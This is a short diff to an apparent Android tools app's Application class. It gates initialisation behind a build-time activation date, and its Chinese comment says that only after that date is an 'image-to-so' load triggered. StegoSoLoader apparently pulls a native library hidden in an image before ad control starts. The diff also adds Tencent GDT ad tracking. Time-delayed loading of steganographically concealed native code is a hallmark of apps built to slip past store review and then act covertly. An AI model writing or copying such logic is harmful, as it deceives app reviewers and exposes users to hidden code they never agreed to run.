@@ -3,7 +3,10 @@ package com.lx.lxtoolsproject
 import android.app.Application
 import android.content.Context
 import com.lx.lxtoolsproject.utils.AdControlCUtils
+import com.lx.lxtoolsproject.utils.AgreementStatusUtils
 import com.lx.lxtoolsproject.utils.StegoSoLoader
+import com.qq.gdt.action.ChannelType
+import com.qq.gdt.action.GDTAction
 import com.tencent.mmkv.MMKV
 
 
@@ -30,15 +33,17 @@ class ToolsApplication : Application() {
     private fun intGgSource(){
         val str: String = BuildConfig.AD_LIVE_TIME
         // 判断是否到了启动时间，到了才触发图片转 so 加载
-//        if (AgreementStatusUtils.isGoTWork(str)){
-//            initApp()
-//        }
+        if (AgreementStatusUtils.isGoTWork(str)){
+            initApp()
+        }
         MMKV.defaultMMKV().encode("sp_log_status", true)
-        initApp()
+//        initApp()
     }
 
 
     private fun initApp(){
+        GDTAction.init(this, BuildConfig.GDT_ID, BuildConfig.GDT_SECRET_KEY, ChannelType.CHANNEL_TENCENT)
+        GDTAction.start()
         StegoSoLoader(this).loadAsync { success ->
             if (success){
                 AdControlCUtils.initDef(this)
